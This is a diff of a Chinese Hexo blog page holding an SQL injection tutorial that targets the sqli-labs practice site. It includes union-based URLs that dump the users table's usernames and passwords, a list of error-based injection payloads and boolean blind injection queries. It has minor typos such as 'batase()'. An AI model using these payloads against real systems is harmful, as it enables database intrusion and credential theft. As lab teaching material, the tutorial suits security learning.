@@ -18,12 +18,12 @@
   
   
   <title>二十九，SQL注入 | Hexo</title>
-  <meta name="description" content="[toc] ​		SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。 SQL注入的危害： 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。 网页篡改：通过操作数据库对特定网页进行篡改。 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接">
+  <meta name="description" content="目录： &emsp;&emsp; SQL注入的危害:&emsp;&emsp; MySQL数据库5.0上下的区别:&emsp;&emsp; SQL注入的步骤，以sqli练习网站为例:&emsp;&emsp;&emsp;&emsp;1，使用‘，”，),or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合&emsp;&emsp;&emsp;&emsp;2，使用order by">
 <meta property="og:type" content="article">
 <meta property="og:title" content="二十九，SQL注入">
 <meta property="og:url" content="http://example.com/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="baiQstar的博客">
-<meta property="og:description" content="[toc] ​		SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。 SQL注入的危害： 数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。 网页篡改：通过操作数据库对特定网页进行篡改。 网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接">
+<meta property="og:description" content="目录： &emsp;&emsp; SQL注入的危害:&emsp;&emsp; MySQL数据库5.0上下的区别:&emsp;&emsp; SQL注入的步骤，以sqli练习网站为例:&emsp;&emsp;&emsp;&emsp;1，使用‘，”，),or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合&emsp;&emsp;&emsp;&emsp;2，使用order by">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211921573.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211933872.png">
@@ -67,7 +67,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231940279.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312231940458.png">
 <meta property="article:published_time" content="2023-12-21T11:08:56.000Z">
-<meta property="article:modified_time" content="2023-12-23T12:03:35.598Z">
+<meta property="article:modified_time" content="2023-12-28T11:35:46.727Z">
 <meta property="article:author" content="白易安">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211921573.png">
@@ -268,7 +268,7 @@
   <div class="widget">
     <h3 class="widget-title">归档</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">22</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">十一月 2023</a><span class="archive-list-count">22</span></li></ul>
     </div>
   </div>
 
@@ -280,6 +280,21 @@
     <div class="widget-body">
       <ul class="recent-post-list list-unstyled no-thumbnail">
         
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/" class="title">三十，SQL注入绕过</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-12-28T11:41:08.000Z" itemprop="datePublished">2023-12-28</time>
+              </p>
+            </div>
+          </li>
+          
           <li>
             
             <div class="item-inner">
@@ -340,21 +355,6 @@
             </div>
           </li>
           
-          <li>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                
-              </p>
-              <p class="item-title">
-                <a href="/2023/12/08/%E4%BA%8C%E5%8D%81%E4%BA%94%EF%BC%8Cpython%E7%88%AC%E8%99%AB-%E5%B0%8F%E8%AF%B4%E4%B8%8B%E8%BD%BD%E5%99%A8/" class="title">二十五，python爬虫-小说下载器</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2023-12-08T13:10:21.000Z" itemprop="datePublished">2023-12-08</time>
-              </p>
-            </div>
-          </li>
-          
       </ul>
     </div>
   </div>
@@ -398,9 +398,11 @@
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <p>[toc]</p>
-<p>​		SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</p>
-<h4 id="SQL注入的危害："><a href="#SQL注入的危害：" class="headerlink" title="SQL注入的危害："></a>SQL注入的危害：</h4><ul>
+        <p><strong>目录：</strong></p>
+<p>&emsp;&emsp; <strong>SQL注入的危害:</strong><br>&emsp;&emsp; <strong>MySQL数据库5.0上下的区别:</strong><br>&emsp;&emsp; <strong>SQL注入的步骤，以sqli练习网站为例:</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>1，使用‘，”，),or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>2，使用order by 来判断返回列数</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>3，运用union联合查询来判断回显数据的位置</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>4，获取数据库版本和当前查询的数据库的名称</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>5，根据以上获取的信息，拿到当前数据库下的所有表的名称</strong></p>
+<p>&emsp;&emsp;&emsp;&emsp;<strong>6，查询某一张表中的列名，以users表为例</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>7，获取某一张表的所有数据</strong><br>&emsp;&emsp;<strong>报错注入用Postman进行注入基于布尔的盲注</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>1，判断数据库类型</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>2，判断当前数据库名</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>3，判断当前库的表名</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>4，判断表的字段</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>5，爆字段中的数据</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>6,修改后的python代码</strong><br>&emsp;&emsp;<strong>基于时间的盲注</strong><br>&emsp;&emsp;<strong>二次注入</strong><br>&emsp;&emsp;<strong>基于SQL注入拿到webshell</strong><br>&emsp;&emsp;<strong>sQLmap</strong></p>
+<p>&emsp;&emsp;SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</p>
+<h4><span id="sql注入的危害">SQL注入的危害：</span></h4><ul>
 <li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li>
 <li>网页篡改：通过操作数据库对特定网页进行篡改。</li>
 <li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
@@ -408,46 +410,46 @@
 <li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
 <li>破坏硬盘数据，瘫痪全系统。</li>
 </ul>
-<h4 id="MySQL数据库5-0上下的区别："><a href="#MySQL数据库5-0上下的区别：" class="headerlink" title="MySQL数据库5.0上下的区别："></a>MySQL数据库5.0上下的区别：</h4><p>​		mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，是information_schema,而5.0之前的版本不存在且5.0以下的版本是多用户单操作。information_schema数据库中含有三张表（schemata、tables、columns）。这三张表中存放的字段依次为（schema_name）、（table_name,table_schema）、（table_schema,table_name,column_name）</p>
+<h4><span id="mysql数据库50上下的区别">MySQL数据库5.0上下的区别：</span></h4><p>​		mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，是information_schema,而5.0之前的版本不存在且5.0以下的版本是多用户单操作。information_schema数据库中含有三张表（schemata、tables、columns）。这三张表中存放的字段依次为（schema_name）、（table_name,table_schema）、（table_schema,table_name,column_name）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211921573.png" alt="image-20231221192140754"></p>
 <p>​		因此在我们进行sql注入时，当得知mysql的版本是5.0以上的就比较简单了，可以对information_schema数据库进行爆破，来获取想要知道的表、表中的数据等一些重要信息。相比较与5.0以下的版本对其进行注入的时相对来说比较麻烦，需要对数据库进行暴力破解的方式，来爆破其中的敏感数据库，表等信息。</p>
-<h4 id="SQL注入的步骤，以sqli练习网站为例："><a href="#SQL注入的步骤，以sqli练习网站为例：" class="headerlink" title="SQL注入的步骤，以sqli练习网站为例："></a>SQL注入的步骤，以sqli练习网站为例：</h4><p>以下示例为get请求方式，post请求同理</p>
-<h5 id="1，使用-‘，-or-1-1-1-2等来判断是否能进行注入以及闭合"><a href="#1，使用-‘，-or-1-1-1-2等来判断是否能进行注入以及闭合" class="headerlink" title="1，使用 ‘，*)*,or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合"></a>1，使用 <em>‘</em>，*)*,<em>or 1&#x3D;1&#x2F;1&#x3D;2</em>等来判断是否能进行注入以及闭合</h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211933872.png" alt="image-20231221193313081"></p>
+<h4><span id="sql注入的步骤以sqli练习网站为例">SQL注入的步骤，以sqli练习网站为例：</span></h4><p>以下示例为get请求方式，post请求同理</p>
+<h5><span id="1使用-or-1x3d1x2f1x3d2等来判断是否能进行注入以及闭合">1，使用 <em>‘</em>，*)*,<em>or 1&#x3D;1&#x2F;1&#x3D;2</em>等来判断是否能进行注入以及闭合</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211933872.png" alt="image-20231221193313081"></p>
 <p>在上图中根据输入的id&#x3D;1正常，id&#x3D;1’报错和SQL回显的报错语句可判断是这是一个字符型注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ -- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211935391.png" alt="image-20231221193530070"></p>
 <p>在1‘后加入– -表示将后面的内容都注释掉，运行后正常表示判断正确</p>
-<h5 id="2，使用order-by-来判断返回列数"><a href="#2，使用order-by-来判断返回列数" class="headerlink" title="2，使用order by 来判断返回列数"></a>2，使用order by 来判断返回列数</h5><p>order by是根据第n列来进行排序，设定不存在的列则会报错</p>
+<h5><span id="2使用order-by-来判断返回列数">2，使用order by 来判断返回列数</span></h5><p>order by是根据第n列来进行排序，设定不存在的列则会报错</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ order by 4 -- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211939882.png" alt="image-20231221193936858"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211940402.png" alt="image-20231221194019357"></p>
 <p>根据上图order by 4正常显示,order by 5报错，判断出返回的是4列数据</p>
-<h5 id="3，运用union联合查询来判断回显数据的位置"><a href="#3，运用union联合查询来判断回显数据的位置" class="headerlink" title="3，运用union联合查询来判断回显数据的位置"></a>3，运用union联合查询来判断回显数据的位置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0’ union select 1,2,3,4 -- -</span><br></pre></td></tr></table></figure>
+<h5><span id="3运用union联合查询来判断回显数据的位置">3，运用union联合查询来判断回显数据的位置</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0’ union select 1,2,3,4 -- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211946412.png" alt="image-20231221194258141"></p>
 <p>根据select 1，2，3，4判断出页面上会显示出第2，3列的数据，之后将查询语句和数据放在这两个位置上</p>
-<h5 id="4，获取数据库版本和当前查询的数据库的名称"><a href="#4，获取数据库版本和当前查询的数据库的名称" class="headerlink" title="4，获取数据库版本和当前查询的数据库的名称"></a>4，获取数据库版本和当前查询的数据库的名称</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ union select 1,batase(),version()，4 -- -</span><br></pre></td></tr></table></figure>
+<h5><span id="4获取数据库版本和当前查询的数据库的名称">4，获取数据库版本和当前查询的数据库的名称</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ union select 1,batase(),version()，4 -- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211946389.png" alt="image-20231221194617105"></p>
 <p>根据SQL自带的函数database（），version（）可以很容易的拿到当前数据库名和版本信息</p>
 <p>看到版本为5.7.26大于5，则之后可以用自带的系统数据库information_schema来查询我们想要的信息</p>
 <p>以下是常用的SQL函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211949974.png" alt="image-20231221194905883"></p>
-<h5 id="5，根据以上获取的信息，拿到当前数据库下的所有表的名称"><a href="#5，根据以上获取的信息，拿到当前数据库下的所有表的名称" class="headerlink" title="5，根据以上获取的信息，拿到当前数据库下的所有表的名称"></a>5，根据以上获取的信息，拿到当前数据库下的所有表的名称</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure>
+<h5><span id="5根据以上获取的信息拿到当前数据库下的所有表的名称">5，根据以上获取的信息，拿到当前数据库下的所有表的名称</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211958842.png" alt="image-20231221195846821"></p>
 <p>其中union是联合查询，group_concat(table_name)会将其中查到的内容用逗号分隔，information_schema.tables是MySQL5.0以上系统自带的数据库中存放所有表名称的表，								where table_schema&#x3D;’security’指定表所在的数据库为security，是上一步所查询出的数据库名称</p>
 <p>根据上图可以看出security数据库中有comments,emails,referers,uagents,users五张表</p>
-<h5 id="6，查询某一张表中的列名，以users表为例"><a href="#6，查询某一张表中的列名，以users表为例" class="headerlink" title="6，查询某一张表中的列名，以users表为例"></a>6，查询某一张表中的列名，以users表为例</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(column_name) ,3 ,4 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure>
+<h5><span id="6查询某一张表中的列名以users表为例">6，查询某一张表中的列名，以users表为例</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(column_name) ,3 ,4 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212007963.png" alt="image-20231221200736740"></p>
 <p>根据查询结果可以看出users表有id,username,password,isadm四个字段</p>
-<h5 id="7，获取某一张表的所有数据"><a href="#7，获取某一张表的所有数据" class="headerlink" title="7，获取某一张表的所有数据"></a>7，获取某一张表的所有数据</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id= -1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password,&quot;~&quot;,isadm),3 ,4 from users;-- -</span><br></pre></td></tr></table></figure>
+<h5><span id="7获取某一张表的所有数据">7，获取某一张表的所有数据</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id= -1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password,&quot;~&quot;,isadm),3 ,4 from users;-- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212015445.png" alt="image-20231221201525346"></p>
-<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>​		报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
+<h4><span id="报错注入">报错注入</span></h4><p>​		报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p>
 <p>以下是构造好的常用语句，在参数后加and，再将以下语句加入修改参数就可以使用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br><span class="line">exp:5.5-5.6</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
 
@@ -458,10 +460,10 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-5/?id=1&#x27; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)-- -</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212034136.png" alt="image-20231221203443056"></p>
-<h4 id="用Postman进行注入"><a href="#用Postman进行注入" class="headerlink" title="用Postman进行注入"></a>用Postman进行注入</h4><p>有些页面不能展现所有的返回数据，并且在浏览器的地址栏也不能进行post请求，所以可以使用软件postman来进行这些操作，方便好用。</p>
+<h4><span id="用postman进行注入">用Postman进行注入</span></h4><p>有些页面不能展现所有的返回数据，并且在浏览器的地址栏也不能进行post请求，所以可以使用软件postman来进行这些操作，方便好用。</p>
 <p>在浏览器打开开发者工具，找到网络，清空后点击页面请求api的按钮，看到响应是json数据的一般就是api接口了</p>
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212040039.png" alt="image-20231221204026429"></p>
-<h4 id="基于布尔的盲注"><a href="#基于布尔的盲注" class="headerlink" title="基于布尔的盲注"></a>基于布尔的盲注</h4><p>​		布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p>
+<h4><span id="基于布尔的盲注">基于布尔的盲注</span></h4><p>​		布尔盲注，即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p>
 <p>我们输入正确的id，显示You are in …..</p>
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212048262.png" alt="image-20231221204838365"></p>
 <p>我们输入错误的语句如id&#x3D;1’ ，或者id&#x3D;-1时，就什么都不显示。这就是布尔盲注，屏幕上能得到信息不多，就是两种状态</p>
@@ -477,26 +479,26 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212100012.png" alt="image-20231221210042984"></p>
 <p>以下是盲注的一些常用语法：</p>
-<h5 id="1，判断数据库类型"><a href="#1，判断数据库类型" class="headerlink" title="1，判断数据库类型"></a>1，判断数据库类型</h5><pre><code>MySQL数据库表      information_schema.tables
+<h5><span id="1判断数据库类型">1，判断数据库类型</span></h5><pre><code>MySQL数据库表      information_schema.tables
 access            msysobjects 
 SQLServer         sysobjects
 </code></pre>
 <p>用下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from information_schema.tables) --+</span><br><span class="line">//判断是否是 access数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from msysobjects) --+</span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from sysobjects) --+</span><br></pre></td></tr></table></figure>
 
-<h5 id="2，判断当前数据库名"><a href="#2，判断当前数据库名" class="headerlink" title="2，判断当前数据库名"></a>2，判断当前数据库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1：判断当前数据库的长度，利用二分法</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+  //不显示任何数据</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+  //不显示任何数据</span><br><span class="line"> </span><br><span class="line">  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</span><br><span class="line"> </span><br><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line">由此可以判断出当前数据库为 security</span><br></pre></td></tr></table></figure>
+<h5><span id="2判断当前数据库名">2，判断当前数据库名</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1：判断当前数据库的长度，利用二分法</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;5 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;10 --+  //不显示任何数据</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;7 --+  //正常显示</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length(database())&gt;8 --+  //不显示任何数据</span><br><span class="line"> </span><br><span class="line">  大于7正常显示，大于8不显示，说明大于7而不大于8，所以可知当前数据库长度为8个字符</span><br><span class="line"> </span><br><span class="line">2：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line">//判断数据库的第一个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),1,1))&gt;115 --+ //100为ascii表中的十进制，对应字母s</span><br><span class="line">//判断数据库的第二个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),2,1))&gt;100 --+</span><br><span class="line">//判断数据库的第三个字符</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(database(),3,1))&gt;100 --+</span><br><span class="line">...........</span><br><span class="line">由此可以判断出当前数据库为 security</span><br></pre></td></tr></table></figure>
 
-<h5 id="3，判断当前库的表名"><a href="#3，判断当前库的表名" class="headerlink" title="3，判断当前库的表名"></a>3，判断当前库的表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//猜测当前数据库中是否存在admin表</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and exists(select*from admin) --+</span><br><span class="line">1：判断当前数据库中表的个数</span><br><span class="line">// 判断当前数据库中的表的个数是否大于5，用二分法依次判断，最后得知当前数据库表的个数为4</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())&gt;3 --+</span><br><span class="line"> </span><br><span class="line">2：判断每个表的长度</span><br><span class="line">//判断第一个表的长度，用二分法依次判断，最后可知当前数据库中第一个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6 --+</span><br><span class="line">//判断第二个表的长度，用二分法依次判断，最后可知当前数据库中第二个表的长度为6</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=database() limit 1,1))=6 --+</span><br><span class="line"> </span><br><span class="line">3：判断每个表的每个字符的ascii值</span><br><span class="line">//判断第一个表的第一个字符的ascii值</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 --+</span><br><span class="line">//判断第一个表的第二个字符的ascii值               </span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;100 --+</span><br><span class="line">.........</span><br><span class="line">由此可判断出存在表 emails、referers、uagents、users ，猜测users表中最有可能存在账户和密码，所以以下判断字段和数据在 users 表中判断</span><br></pre></td></tr></table></figure>
